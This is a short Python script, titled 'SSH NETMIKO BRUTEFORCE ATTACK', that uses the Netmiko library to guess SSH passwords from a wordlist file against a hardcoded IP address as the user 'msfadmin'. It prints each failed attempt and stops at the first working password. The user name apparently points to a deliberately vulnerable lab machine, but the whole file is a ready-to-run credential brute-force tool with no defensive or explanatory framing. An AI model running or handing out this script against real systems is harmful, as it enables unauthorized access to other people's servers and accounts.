#!/usr/bin/python
from netmiko import Netmiko
target = '11.11.11.171'
user = 'msfadmin'
device = 'linux'
verbose = True
print('=' * 60)
print('SSH NETMIKO BRUTEFORCE ATTACK')
print('=' * 60)
print()

def bruteforceattack(_target,_user,_pwd,_device):
    try:
        sshmiko = Netmiko(
                _target,
                username = _user,
                password = _pwd,
                device_type = _device)

        sshmiko.disconnect()
        print('[+] BINGO - username:', _user, 'password:', _pwd)
        return True

    except:
        if verbose:
            print('[-] FAIL - username:', _user, 'password:', _pwd)

def user_wordlist(_target,_user,_wordlist,_device):
    with open(_wordlist, 'r') as _word:
        for _line in _word:
            _pwd = _line.strip('\n')

            bingo=bruteforceattack(_target,_user,_pwd,_device)
            
            if bingo:
                break

user_wordlist(target, user, 'word.txt', device)
print()
print('=' * 60)

